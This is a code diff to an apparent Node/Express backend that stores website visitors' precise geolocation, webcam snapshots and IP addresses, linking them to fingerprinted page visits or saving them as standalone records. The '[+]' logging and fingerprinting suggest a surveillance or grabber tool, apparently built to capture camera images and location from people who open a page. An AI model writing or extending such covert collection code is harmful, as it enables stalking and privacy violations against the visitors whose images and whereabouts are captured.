@@ -50,13 +50,28 @@ app.post('/api/geolocation', (req, res) => {
   if (!id) return res.json({ status: 'error', message: 'Missing id' });
 
   const records = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
-  const record = records.find(r => r.id === id);
+  const record = records.find(r => r.id === id && r.type === 'page_visit');
+  const timestamp = new Date().toISOString();
+  
   if (record) {
     record.geolocation = { latitude, longitude, accuracy };
-    record.geo_timestamp = new Date().toISOString();
-    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
-    console.log(`[+] Geolocation saved for ${record.fingerprint?.userAgent?.slice(0, 40) || id}`);
+    record.geo_timestamp = timestamp;
+    console.log(`[+] Geolocation updated on page_visit for ${id}`);
+  } else {
+    // Save as standalone entry
+    records.push({
+      id,
+      type: 'geolocation',
+      latitude,
+      longitude,
+      accuracy,
+      timestamp,
+      ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress
+    });
+    console.log(`[+] Standalone Geolocation saved for ${id}`);
   }
+  
+  fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
   res.json({ status: 'ok' });
 });
 
@@ -66,13 +81,26 @@ app.post('/api/webcam', (req, res) => {
   if (!id) return res.json({ status: 'error', message: 'Missing id' });
 
   const records = JSON.parse(fs.readFileSync(DATA_FILE, 'utf-8'));
-  const record = records.find(r => r.id === id);
+  const record = records.find(r => r.id === id && r.type === 'page_visit');
+  const timestamp = new Date().toISOString();
+
   if (record) {
     record.webcam_image = image;
-    record.webcam_timestamp = new Date().toISOString();
-    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
-    console.log(`[+] Webcam snapshot saved for ${id}`);
+    record.webcam_timestamp = timestamp;
+    console.log(`[+] Webcam image updated on page_visit for ${id}`);
+  } else {
+    // Save as standalone entry
+    records.push({
+      id,
+      type: 'webcam',
+      image,
+      timestamp,
+      ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress
+    });
+    console.log(`[+] Standalone Webcam snapshot saved for ${id}`);
   }
+
+  fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
   res.json({ status: 'ok' });
 });
 
